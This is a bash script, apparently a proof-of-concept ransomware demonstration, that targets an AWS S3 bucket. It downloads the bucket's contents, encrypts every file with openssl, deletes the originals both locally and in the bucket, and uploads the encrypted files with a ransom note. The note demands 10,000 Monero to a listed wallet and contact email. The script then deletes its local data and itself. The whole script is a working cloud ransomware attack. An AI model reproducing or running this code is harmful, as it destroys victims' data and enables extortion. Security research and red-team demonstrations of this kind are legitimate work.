#!/bin/bash

## Create & Goto Data directory
mkdir Data
cd Data

printf "[+] Connecting to target S3 bucket...\n"

## Download files from from S3 bucket
printf "[*] Connection successful!\n\n"
sleep 1
printf "[+] Downloading files from bucket...\n"
sleep 1
aws s3 cp --recursive s3://platinum-sec-blood-private/poc1/ ./
printf "[*] Download completed!\n"
sleep 1

## Copying files to a backup subdir for later decryption
mkdir -p ../.OriginalData
cp -r . ../.OriginalData/

## Encrypt files downloaded from S3 bucket
printf "\n[!] Type encryption key for locking the files:\n"
ENC_KEY=
while IFS= read -r -s -n1 char; do
  if [[ $char == $'\0' ]]; then
    break
  fi
  ENC_KEY=$ENC_KEY$char
  echo -n "*"
done

## Print encryption key to screen
# printf "$ENC_KEY"

## Encrypt files locally using openSSL
printf "\n[+] Encrypting downloaded files...\n"
find ./* -type f -exec openssl enc -aes-256-cbc -pbkdf2 -salt -in {} -out {}.encrypted -k $ENC_KEY \;  -exec rm {} \;

## Create ranson note text file
echo "                                  _           _ _ _ "                                                 >> what_happened_to_my_files.txt
echo "                                 | |         | | | |"                                                 >> what_happened_to_my_files.txt
echo "  ___ _ __   ___ _ __ _   _ _ __ | |_ ___  __| | | |"                                                 >> what_happened_to_my_files.txt
echo " / _ |  _ \ / __|  __| | | |  _ \| __/ _ \/ _  | | |"                                                 >> what_happened_to_my_files.txt
echo "|  __| | | | (__| |  | |_| | |_) | ||  __| (_| |_|_|"                                                 >> what_happened_to_my_files.txt
echo " \___|_| |_|\___|_|   \__, | .__/ \__\___|\__,_(_(_)"                                                 >> what_happened_to_my_files.txt
echo "                       __/ | |                      "                                                 >> what_happened_to_my_files.txt
echo "                      |___/|_|                      "                                                 >> what_happened_to_my_files.txt
echo " "                                                                                                    >> what_happened_to_my_files.txt
echo "Ooops, your important files are encrypted. "                                                          >> what_happened_to_my_files.txt
echo " "                                                                                                    >> what_happened_to_my_files.txt
echo "If you see this text, then your files are no longer accessible, because they have been encrypted."    >> what_happened_to_my_files.txt
echo "Perhaps you are busy looking for a way to recover your files, but don't waste your time."             >> what_happened_to_my_files.txt
echo "Nobody can recover your files without our decryption service. "                                       >> what_happened_to_my_files.txt
echo "We guarantee that you can recover all your files safely and easily. All you need to do is submit the" >> what_happened_to_my_files.txt
echo "payment and purchase the decryption key."                                                             >> what_happened_to_my_files.txt
echo " "                                                                                                    >> what_happened_to_my_files.txt
echo "Please follow the instructions: "                                                                     >> what_happened_to_my_files.txt
echo "1. Send 10,000 Monero (XMR) coins to following address:"                                              >> what_happened_to_my_files.txt
echo " "                                                                                                    >> what_happened_to_my_files.txt
echo "456YgVmCSEB7NomE7E7E7b1vKfnHFXzkn8w5YEjEppoSGSf1NAsxW5qLR12C7yjznvjhVbVu6Wqep2ZTrcKoXygxe96JF6zN3 "   >> what_happened_to_my_files.txt
echo " "                                                                                                    >> what_happened_to_my_files.txt
echo "2. Send your Monero wallet ID and personal installation key to e—Mail Ilp8xv3j@proton.me. Your"       >> what_happened_to_my_files.txt
echo "personal installation key: "                                                                          >> what_happened_to_my_files.txt
echo " "                                                                                                    >> what_happened_to_my_files.txt
echo "8944fa8a-e9d5-4719-ae33-c7d9ca9a8dd5"                                                                 >> what_happened_to_my_files.txt

printf "[*] Encryption completed!\n"
sleep 1

## Delete exisiting files on s3 bucket
printf "\n[+] Deleting original files downloaded from S3 bucket...\n"
sleep 1
aws s3 rm --recursive s3://platinum-sec-blood-private/poc1/
printf "\n[*] S3 bucket files successfully deleted!\n"
sleep 1

## Upload encrypted files + ransom note to s3 bucket
printf "\n[+] Uploading encrypted files and ransom notice...\n"
sleep 1
aws s3 cp --recursive ./ s3://platinum-sec-blood-private/poc1/
printf "\n[*] Encrypted files and ransom notice successfully uploaded!\n"

## Delete locally stored files and directory
printf "\n[+] Deleting locally store data\n"
cd ..
rm -rfv Data
rm -rfv encrypt.sh
printf "\n[V] All done!\n"


